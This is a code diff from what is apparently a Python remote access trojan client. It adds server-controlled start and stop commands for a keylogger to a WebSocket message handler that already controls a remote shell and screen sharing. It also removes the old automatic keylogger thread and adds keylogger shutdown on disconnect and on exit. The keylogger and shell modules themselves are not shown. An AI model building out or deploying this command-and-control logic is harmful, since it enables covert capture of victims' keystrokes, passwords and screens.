@@ -54,6 +54,14 @@ def on_message(ws, message):
             else:
                 ws.send(json.dumps({"type": "screenshare_output", "data": f"[Info] Unknown screenshare_command: {msg_data}"}))
 
+        elif msg_type == "keylogger_command":
+            if msg_data == "start":
+                keylogger.start_keylogger(ws_holder)
+            elif msg_data == "stop":
+                keylogger.stop_keylogger()
+            else:
+                ws.send(json.dumps({"type": "keylogger_output", "data": f"[Info] Unknown keylogger_command: {msg_data}"}))
+
         elif msg_type == "Disconnect":
             print(f"[Info] Received server-initiated disconnect: {msg_data}")
             should_reconnect = False
@@ -62,13 +70,17 @@ def on_message(ws, message):
     except json.JSONDecodeError:
         print("[Error] Failed to decode server message.")
 
+
 def on_error(ws, error):
     print(f"[WebSocket Error] {error}")
+
 
 def on_close(ws, close_status_code, close_msg):
     print("[WebSocket] Connection closed.")
     shell.stop_shell(ws)
     screenshare.stop_screenshare()
+    keylogger.stop_keylogger()
+
 
 def on_open(ws):
     global seconds_disconnected, ws_holder
@@ -85,6 +97,7 @@ def on_open(ws):
     }
 
     ws.send(json.dumps(rat_info))
+
 
 def run_websocket():
     global seconds_disconnected, should_reconnect, ws_holder
@@ -108,15 +121,13 @@ def run_websocket():
         print(f"[Reconnect] Lost connection. Retrying in {RECONNECT_DELAY}s (disconnected for {seconds_disconnected}s)...")
         time.sleep(RECONNECT_DELAY)
 
+
 def main():
     global client_uuid
 
     args = util.parse_arguments()
     client_uuid = args.uuid or str(uuid.uuid4())
     print(f"[Info] Using UUID: {client_uuid}")
-
-    keylogger_thread = threading.Thread(target=keylogger.start, args=(ws_holder,), daemon=True)
-    keylogger_thread.start()
 
     thread = threading.Thread(target=run_websocket, daemon=True)
     thread.start()
@@ -129,6 +140,7 @@ def main():
         if shell.shell_running:
             shell.stop_shell(ws_holder.ws)
         screenshare.stop_screenshare()
+        keylogger.stop_keylogger()
 
 if __name__ == "__main__":
     main()
